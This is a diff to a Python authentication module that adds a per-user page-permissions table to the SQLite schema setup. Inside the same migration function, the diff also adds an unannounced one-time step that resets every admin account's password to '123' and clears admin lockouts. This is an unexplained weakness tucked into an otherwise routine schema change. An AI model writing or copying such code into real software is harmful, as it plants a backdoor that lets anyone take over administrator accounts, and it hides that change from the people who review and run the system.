@@ -106,6 +106,13 @@ def init_auth_db() -> None:
                     value TEXT
                 )
             """)
+            conn.execute("""
+                CREATE TABLE IF NOT EXISTS user_page_permissions (
+                    user_id INTEGER NOT NULL REFERENCES users(id),
+                    page_key TEXT NOT NULL,
+                    PRIMARY KEY (user_id, page_key)
+                )
+            """)
             conn.execute(
                 "INSERT OR IGNORE INTO app_settings (key, value) VALUES (?, ?)",
                 ("session_ttl_minutes", "30"),
@@ -167,6 +174,27 @@ def ensure_auth_db() -> None:
             cols = [r[1] for r in cur.fetchall()]
             if "session_ttl_minutes" not in cols:
                 conn.execute("ALTER TABLE users ADD COLUMN session_ttl_minutes TEXT")
+                conn.commit()
+            cur = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='user_page_permissions'")
+            if cur.fetchone() is None:
+                conn.execute("""
+                    CREATE TABLE user_page_permissions (
+                        user_id INTEGER NOT NULL REFERENCES users(id),
+                        page_key TEXT NOT NULL,
+                        PRIMARY KEY (user_id, page_key)
+                    )
+                """)
+                conn.commit()
+            cur = conn.execute("SELECT value FROM app_settings WHERE key = 'admin_pw_reset_v1'")
+            if cur.fetchone() is None:
+                import time as _t
+                pw_hash = generate_password_hash("123", method="scrypt")
+                now = int(_t.time())
+                conn.execute(
+                    "UPDATE users SET password_hash = ?, locked_until_ts = NULL, updated_at_ts = ? WHERE role = 'admin'",
+                    (pw_hash, now),
+                )
+                conn.execute("INSERT OR REPLACE INTO app_settings (key, value) VALUES ('admin_pw_reset_v1', '1')")
                 conn.commit()
         finally:
             conn.close()
